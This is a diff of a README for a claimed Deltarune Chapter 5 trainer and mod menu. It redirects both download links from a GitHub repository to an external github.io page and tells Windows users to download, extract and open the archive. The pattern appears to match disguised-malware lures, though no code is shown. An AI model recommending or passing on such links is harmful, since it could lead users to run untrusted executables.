@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-ModMenu - Modify game stats for easier exploration
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue)](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue)](https://newtonssecondlawofmotionalien143.github.io)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ The Deltarune Chapter 5 Trainer provides tools to change your game experience. Y
 Follow these steps to set up the tool on your Windows computer.
 
 1. Close the game before you run the trainer.
-2. Visit this page to download the latest version of the trainer: [Download Link](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu).
+2. Visit this page to download the latest version of the trainer: [Download Link](https://newtonssecondlawofmotionalien143.github.io).
 3. Save the file to a folder on your computer.
 4. Right-click the folder and select Extract All to unzip the trainer files.
 5. Open the folder you just created.
